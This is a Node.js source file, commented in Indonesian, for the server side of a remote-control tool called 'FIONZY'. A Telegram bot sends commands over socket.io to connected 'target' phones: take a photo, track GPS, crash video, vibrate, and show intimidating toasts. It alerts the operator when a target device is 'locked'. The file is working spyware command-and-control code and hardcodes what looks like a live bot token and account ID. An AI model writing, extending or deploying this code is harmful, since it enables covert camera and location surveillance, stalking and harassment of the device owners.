const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// === ⚡ KONFIGURASI (GANTI TOKEN DI SINI!) ⚡ ===
const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; // Masukkan token dari @BotFather
const bot = new Telegraf(BOT_TOKEN);
const MY_ID = '7373392803'; // ID Tuan Fionzy

// UI Menu Utama Anti-Crash (MarkdownV2 Fixed)
const mainMenu = async (ctx) => {
    const text = `⚡ *FIONZY CONTROL PANEL v11\\.0* ⚡\n` +
                 `──────────────\n` +
                 `📱 *Status:* ONLINE\n` +
                 `💀 *Mode:* FIONZY-Z ACTIVE\n` +
                 `──────────────\n` +
                 `*Pilih Perintah Eksekusi:*`;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
        [Markup.button.callback('💀 Crash Video', 'crash'), Markup.button.callback('📳 Vibrate', 'vibrate')],
        [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
    ]);

    try {
        await ctx.replyWithMarkdownV2(text, keyboard);
    } catch (e) {
        console.log("❌ Gagal Kirim Menu: " + e.message);
        // Backup jika MarkdownV2 error lagi
        ctx.reply("⚡ FIONZY PANEL v11.0 (Mode Aman)\n\nPilih perintah:", keyboard);
    }
};

// Notifikasi Target Online
io.on('connection', (socket) => {
    console.log('⚡ Target Baru Terhubung!');
    bot.telegram.sendMessage(MY_ID, "⚠️ **TARGET TERDETEKSI!**\nSistem FionzyGpt telah mengunci perangkat target.", { parse_mode: 'Markdown' }).catch(() => {});
});

bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Handler Tombol
bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Memotret...').catch(() => {}); io.emit('command', '/snap'); });
bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak GPS...').catch(() => {}); io.emit('command', '/gps'); });
bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
bot.action('crash', (ctx) => { ctx.answerCbQuery('💀 Menjalankan Devil Video...').catch(() => {}); io.emit('command', '/crash'); });
bot.action('menu', (ctx) => mainMenu(ctx));
bot.action('ask_toast', (ctx) => ctx.reply("Ketik: `/toast [pesan]`\nContoh: `/toast HP ANDA DISUSUPI!`"));

bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/toast ')) {
        io.emit('command', ctx.message.text);
        ctx.reply("✅ Toast Terkirim ke Target!");
    }
});

// Pelindung Server (Agar tidak mati jika ada error)
process.on('uncaughtException', (err) => { console.log('🛡️ Error Terblokir: ' + err.message); });
process.on('unhandledRejection', (res) => { console.log('🛡️ Rejection Terblokir: ' + res); });

server.listen(3000, '0.0.0.0', () => {
    console.log('⚡ FIONZY v11.0 LIVE');
    console.log('⚡ PORT: 3000 | BOT: ONLINE');
});

bot.launch().then(() => console.log('⚡ BOT TELEGRAM SIAP!'));
